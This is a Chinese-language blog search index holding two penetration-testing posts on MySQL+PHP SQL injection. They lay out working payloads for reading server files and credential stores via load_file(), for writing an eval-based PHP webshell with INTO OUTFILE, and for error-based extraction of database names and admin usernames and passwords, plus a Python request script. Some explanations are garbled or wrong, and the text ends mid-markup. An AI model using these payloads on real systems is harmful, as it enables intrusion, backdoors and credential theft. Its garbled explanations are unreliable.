<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入篇MySQL+PHP读写操作</title>
      <link href="/post/fe1c6489.html"/>
      <url>/post/fe1c6489.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入MySQL-PHP读写操作"><a href="#SQL注入MySQL-PHP读写操作" class="headerlink" title="SQL注入MySQL+PHP读写操作"></a>SQL注入MySQL+PHP读写操作</h1><h2 id="读，secure-file-priv变量"><a href="#读，secure-file-priv变量" class="headerlink" title="读，secure_file_priv变量"></a>读，<code>secure_file_priv</code>变量</h2><p>在MySQL中，<code>secure_file_priv</code>是一个关键的系统变量，用于控制服务器对文件系统的访问权限。下面是关于这个特性的详细解释：</p><ol><li><p><strong>默认设置</strong>：<code>secure_file_priv</code>默认值为NULL，这意味着MySQL不允许任何文件的导入和导出操作。这是出于安全考虑，以防止潜在的恶意行为。</p></li><li><p><strong>查看当前设置</strong>：你可以通过执行SQL命令<code>SELECT @@GLOBAL.secure_file_priv;</code>来查看当前的<code>secure_file_priv</code>设置。</p></li><li><p><strong>指定目录</strong>：如果<code>secure_file_priv</code>被设置为一个具体的文件夹路径，那么MySQL将只能在此指定的文件夹内进行文件的导入和导出操作。这有助于限制MySQL的文件系统访问，仅在特定情况下允许特定的目录。</p></li><li><p><strong>无限制设置</strong>：如果<code>secure_file_priv</code>没有被设置（即为空），则表示对文件的读写没有任何限制。然而，这种情况很少见，因为它可能会带来安全隐患。</p></li><li><p><strong>配置文件修改</strong>：由于<code>secure_file_priv</code>参数不能动态更改，你需要在MySQL的配置文件中进行修改。在Windows系统下，需要修改<code>my.ini</code>文件，在Linux系统下，需要修改<code>my.cnf</code>文件。修改后，必须重启MySQL服务才能使设置生效。</p></li><li><p><strong>PHP配置</strong>：当涉及到从MySQL写入文件时，还需要检查PHP的配置。在<code>php.ini</code>文件中，<code>gpc</code>（Get&#x2F;Post&#x2F;Cookie）设置决定了是否对特殊字符进行转义。如果<code>gpc</code>开启，特殊字符如单引号(‘)会被转义为(&#x2F;)，这可能会影响到写入文件的内容。</p></li></ol><p>综上所述，<code>secure_file_priv</code>是MySQL中用于控制文件读写权限的重要参数，它有助于提高数据库的安全性。在使用时，应根据实际需求合理配置，并注意与PHP配置的兼容性。</p><h2 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file()函数"></a><code>load_file()</code>函数</h2><ol><li><p>读取当前目录下的<code>index.php</code>文件：</p><ul><li>通过<code>LOAD_FILE()</code>函数，攻击者尝试读取Web服务器根目录下的<code>index.php</code>文件。这可能包含有关网站结构和功能的敏感信息</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\index.php&#x27;</span>)</span><br><span class="line"># 或，两个作用一样</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;C:/inetpub/wwwroot/target_sys.com/index.php&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>读取配置文件：</p><ul><li>使用<code>LOAD_FILE()</code>函数尝试读取MySQL的配置文件（通常是<code>my.cnf</code>或<code>my.ini</code>）。这个文件包含了数据库的关键配置信息，如用户名、密码和连接设置，读取它可能会使攻击者能够获取数据库的访问权限。</li><li>在最后一个示例中，文件路径使用了十六进制编码（例如<code>0x433a2f...</code>），这是为了绕过某些安全措施，如输入过滤或白名单机制</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;C:/inetpub/wwwroot/target_sys.com/data/config.inc.php&#x27;</span>)</span><br><span class="line"># 或，可以转换为<span class="number">16</span>进制</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="number">0x433a2f696e65747075622f777777726f6f742f7461726765745f7379732e636f6d2f646174612f636f6e6669672e696e632e706870</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="windows、linux-常用目录文件"><a href="#windows、linux-常用目录文件" class="headerlink" title="windows、linux 常用目录文件"></a>windows、linux 常用目录文件</h2><ol><li>windows下<ul><li><code>C:\boot.ini</code> - 查看系统版本</li><li><code>C:\Windows\php.ini</code> - PHP配置信息</li><li><code>C:\Windows\my.ini</code> - MySQL配置文件，记录管理员登录过的MySQL用户名和密码</li><li><code>C:\Winnt\php.ini</code></li><li><code>C:\Winnt\my.ini</code></li><li><code>C:\mysqldata\mysql\user.MYD</code> - 存储了mysql.user表中的数据库连接密码</li><li><code>C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini</code> - 存储了虚拟主机网站路径和密码</li><li><code>C:\Program Files\Serv-U\ServUDaemon.ini</code></li><li><code>C:\Windows\System32inetsrv\MetaBase.xml</code> - 查看IIS的虚拟主机配置</li><li><code>C:\Windows\repair\sam</code> - 存储了Windows系统初次安装的密码</li><li><code>C:\Program Files\Serv-U\ServUAdmin.exe</code> - 6.0版本以前的Serv-U管理员密码存储于此</li><li><code>C:Program Files\RhinoSoft.com\ServUDaemon.exe</code></li><li><code>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif</code> - 存储了pcAnywhere的登录密码</li><li><code>C:\Program FilesApache Group\Apache\conf\httpd.conf</code> 或 <code>C:\apache\conf\httpd.conf</code> - 查看Windows系统Apache文件</li><li><code>C:Resin-3.0.14\conf\resin.conf</code> - 查看JSP开发的网站Resin文件配置信息</li><li><code>C:\Resin\conf\resin.conf</code> 或 &#x2F;usr&#x2F;local&#x2F;resin&#x2F;conf&#x2F;resin.conf - 查看Linux系统配置的JSP虚拟主机</li><li><code>D:\APACHE\Apache2\conf\httpd.conf</code></li><li><code>C:\Program Files\mysql\my.ini</code></li><li><code>C:mysql\data\mysql\user.MYD</code> - 存在MySQL系统中的用户密码</li></ul></li><li>LUNIX&#x2F;UNIX 下<ul><li><code>/usr/local/app/apache2/conf/httpd.conf</code>：Apache HTTP服务器的默认配置文件。</li><li><code>/usr/local/apache2/conf/httpd.conf</code>：Apache HTTP服务器的配置文件。</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</code>：Apache HTTP服务器的虚拟主机设置文件。</li><li><code>/usr/local/app/php5/lib/php.ini</code>：PHP相关的设置文件。</li><li><code>/etc/sysconfig/iptables</code>：防火墙规则策略文件。</li><li><code>/etc/httpd/conf/httpd.conf</code>：Apache HTTP服务器的配置文件。</li><li><code>/etc/rsyncd.conf</code>：同步程序的配置文件。</li><li><code>/etc/my.cnf</code>：MySQL数据库的配置文件。</li><li><code>/etc/redhat-release</code>：系统版本的文件。</li><li><code>/etc/issue</code>：系统发行版信息的文件。</li><li><code>/etc/issue.net</code>：网络系统发行版信息的文件。</li><li><code>/usr/local/app/php5/lib/php.ini</code>：PHP相关的设置文件。</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</code>：Apache HTTP服务器的虚拟主机设置文件。</li><li><code>/etc/httpd/conf/httpd.conf</code>或<code>/usr/local/apache/conf/httpd.conf</code>：查看Linux Apache虚拟主机配置文件。</li><li><code>/usr/local/resin-3.0.22/conf/resin.conf</code>：针对3.0.22的RESIN配置文件查看。</li><li><code>/usr/local/resin-pro-3.0.22/conf/resin.conf</code>：同上。</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</code>：Apache虚拟主机查看。</li><li><code>/etc/httpd/conf/httpd.conf</code>或<code>/usr/local/apache/conf/httpd.conf</code>：查看Linux Apache虚拟主机配置文件。</li><li><code>/usr/local/resin-3.0.22/conf/resin.conf</code>：针对3.0.22的RESIN配置文件查看。</li><li><code>/usr/local/resin-pro-3.0.22/conf/resin.conf</code>：同上。</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</code>：Apache虚拟主机查看。</li><li><code>/etc/sysconfig/iptables</code>：查看防火墙策略。</li></ul></li></ol><p><code>load_file(char(47))</code> 可以列出 FreeBSD 和 SunOS 系统根目录。</p><p><code>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</code> 将文件路径 <code>/etc/passwd</code> 中的小于号（&lt;）替换为空格。</p><p><code>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</code> 将文件路径 <code>/etc/passwd</code> 中的小于号（&lt;）替换为空格。</p><h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 两个作用一样</span><br><span class="line"><span class="keyword">into</span> outfile 文件导出 空格</span><br><span class="line"></span><br><span class="line"><span class="keyword">into</span> dumpfile 没有空格</span><br></pre></td></tr></table></figure><ol><li><p>关闭GPC（通用参数覆盖）功能，以防止恶意代码被过滤。</p></li><li><p>确保目标目录可写，以便将shell脚本写入该目录</p></li><li><p>写shell话到当前目录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php phpinfo();eval($_POST[\&#x27;</span>smoon\<span class="string">&#x27;]);?&gt;&#x27;</span>,<span class="number">3</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:\\inetpub\\wwwroot\\target_sys.com\\smoon.php&#x27;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入篇MySQL+PHP手工注入</title>
      <link href="/post/2826c232.html"/>
      <url>/post/2826c232.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入MySQL-PHP报错注入"><a href="#SQL注入MySQL-PHP报错注入" class="headerlink" title="SQL注入MySQL+PHP报错注入"></a>SQL注入MySQL+PHP报错注入</h1><p>mysql在执行 SQL语句的时，如果语句有错会返回报错信息，在与php结合使用的时候默认并不会把报错的信息在页面显示出来。如果要在php显示出来，在执行语句的时候我们可以使用<code>mysql_error()</code>函数才可以把错误的信息显示到页面。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="number">1</span>; <span class="comment">// 假设要查询的文章ID为1</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SELECT * FROM article WHERE id=<span class="subst">$id</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());    </span><br></pre></td></tr></table></figure><p>在这个例子中，如果SQL语句执行出错，<code>mysql_error()</code>函数会捕获错误信息，将错误信息显示在页面上。</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071637099.png" alt="image-20240306153158320"></p><h2 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><ul><li><code>and</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 页面是否返回正常，或是否存在报错信息</span><br><span class="line"># 双方为真或者一方为真时返回正常，双方为假时返回空出现错误</span><br><span class="line"># <span class="keyword">and</span> 函数：</span><br><span class="line"># 例子：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # 正常</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>article.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 失败</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">解释：攻击者尝试通过在原始查询中追加 and 1=1 或 and 1=2 的条件，来观察页面的返回情况。</span></span><br><span class="line"><span class="comment">当 and 1=1 为真时，页面正常返回，表示注入点存在并且条件成立。</span></span><br><span class="line"><span class="comment">当 and 1=2 为真时，页面返回错误或为空，表示条件不成立，可能是注入点不存在或者条件错误。</span></span><br></pre></td></tr></table></figure><h2 id="2、爆库"><a href="#2、爆库" class="headerlink" title="2、爆库"></a>2、爆库</h2><ul><li><code>info()</code>函数可以用于获取当前数据库（库）的名称</li></ul><h2 id="3、报错语句"><a href="#3、报错语句" class="headerlink" title="3、报错语句"></a>3、报错语句</h2><ul><li><p>通过<code>floor</code>数据库版本通用暴错</p><p>1、数据库版本：使用<code>floor</code>函数避免报错，同时利用<code>concat</code>函数，<code>version()</code>函数获取数据库版本信息将结果与随机数拼接在一起。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 利用version()函数获取数据库版本信息，并将其编码为<span class="number">0x7e</span>（波浪线）包裹的形式以避免特殊字符引起的问题</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">select</span> concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>))) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>2、简单办法暴库：使用<code>floor</code>函数和<code>concat</code>函数获，<code>（）</code>取数据库名称。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用<span class="keyword">user</span>()函数获取当前数据库连接的用户名</span><br><span class="line">id<span class="operator">=</span>info()</span><br></pre></td></tr></table></figure><p>3、连接用户：使用<code>floor</code>函数和<code>concat</code>函数获取当前连接的用户。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">select</span> concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>4、连接数据库：使用<code>floor</code>函数和<code>concat</code>函数，使用<code>database()</code>函数获取当前连接的数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 同样使用database()函数获取当前正在使用的数据库名。</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">select</span> concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>))) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>5、暴库：使用<code>floor</code>函数和<code>concat</code>函数，通过<code>information_schema.schemata</code>表获取获取所有数据库的名称。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有数据库名，通过information_schema.schemata表获取，并进行编码。</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>6、暴表：使用<code>floor</code>函数和<code>concat</code>函数，通过<code>information_schema.tables</code>表获取指定数据库中的所有表名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 在当前所连接的数据库中列出第一个表名，通过information_schema.tables表获取，并进行编码。</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,table_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>7、暴字段：使用<code>floor</code>函数和<code>concat</code>函数，通过<code>information_schema.columns</code>表获取指定表中的所有字段名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 提取名为admin的表的第一个字段名，通过information_schema.columns表获取，并进行编码。</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,column_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E</span> LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>8、暴内容：使用<code>floor</code>函数和<code>concat</code>函数获取指定表中的用户名和密码。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 尝试从admin表中获取第一条记录的username和password字段值，并用#符号分隔，然后编码。</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li><li><p>有版本限制，有时候会显示不出来，<code>ExtractValue</code>(有长度限制,最长32位)</p><p>1、获取MySQL数据库的版本信息：<code>and extractvalue(1, concat(0x7e, (select @@version),0x7e))</code></p><p>2、获取admin表中的用户名和密码：<code>and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))</code></p></li><li><p>显示不出来用<code>UpdateXml</code>(有长度限制,最长32位)</p><p>1、获取MySQL数据库的版本信息：<code>and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p><p>2、获取admin表中的用户名和密码：<code>and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></p><p>3、上面这种查询，只能查询32位所以有些部分查询不出来。可以先查询密文，或者先查询长度，再进行字符长度的截取。</p><ul><li><p><code>LENGTH</code> 函数查询的长度，示例：<code>and updatexml(1,concat(0x7e,(SELECT distinct LENGTH(concat(0x23,username,0x3a,password,0x23)) FROM admin limit 0,1),0x7e),1)</code></p></li><li><p><code>SUBSTRING()</code>字符串截取函数，示例：<code>and updatexml(1,concat(0x7e,(SELECT distinct SUBSTRING(concat(0x23,username,0x3a,password,0x23),1,32) FROM admin limit 0,1),0x7e),1)</code>，<code>1,32</code>从第一位开始一直截取到第三十二位。后面类似如<code>33，50</code>从第三十二位开始一直截取到第五十位，再后将字符并接起来就是完整的的数据。</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071637958.png" alt="image-20240306163129317"></p></li></ul></li><li><p><code>NAME_CONST</code>(适用于低版本)</p><p><code>NAME_CONST</code> 是MySQL中的一个内置函数，用于在查询内部声明一个命名的常量。利用<code>NAME_CONST(version(),1)</code>来尝试触发MySQL服务器响应，从而泄露版本信息或其他相关信息。这里的<code>and+1=(select+*+from+...)--</code>结构是为了构造一个总是为真的条件，使得原有的SQL查询继续执行，而<code>--+</code>则是注释符，用于注释掉原有的SQL语句剩余部分，从而使注入的SQL语句被执行。使用示例：<code>and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--</code></p></li><li><p><code>Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)</code></p><ul><li><pre><code class="sql">or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 用`GROUP BY`和`HAVING`子句结合MySQL的`concat_ws`函数和`rand()`函数，通过触发SQL错误来泄露数据库版本信息。`concat_ws`函数在这里用于连接`version()`函数返回的数据库版本和一个随机数（`floor(rand(0)*2)`），并用十六进制表示的波浪线（`0x7e`）作为分隔符。`min(0)`加上`or 1`是为了确保整个条件始终为真，让整个注入语句能够成功执行。</span><br><span class="line"></span><br><span class="line">- 由于`GROUP BY`试图对非聚合函数的结果进行分组，数据库会抛出错误。错误信息中可能会包含构造的字符串，即经过`concat_ws`处理过的数据库版本信息，可以据此得知数据库版本。</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  # 示例代码</span><br><span class="line">  import requests</span><br><span class="line">  </span><br><span class="line">  url = &quot;http://www.example.com/login&quot;</span><br><span class="line">  payload = &quot;&#x27; or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0)+or+1 -- -&quot;</span><br><span class="line">  data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;password&quot;&#125;</span><br><span class="line">  </span><br><span class="line">  response = requests.post(url, data=data)</span><br><span class="line">  </span><br><span class="line">  if response.status_code == 200:</span><br><span class="line">      print(&quot;成功获取数据库版本信息&quot;)</span><br><span class="line">  else:</span><br><span class="line">      print(&quot;获取失败&quot;)</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>另外的报错语句</p><ul><li><p><code>floor()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了<span class="built_in">floor</span>()函数和rand()函数来生成一个随机数，然后将其与用户信息连接起来。如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></li><li><p><code>extractvalue()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了extractvalue()函数来提取XML数据。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></li><li><p><code>updatexml()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了updatexml()函数来更新XML数据。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure></li><li><p><code>geometrycollection()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了geometrycollection()函数来创建一个几何集合。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multipoint()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个查询语句使用了multipoint()函数来创建一个多点对象。它将用户信息作为参数传递给函数，如果成功执行，将返回数据库中的所有记录。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span 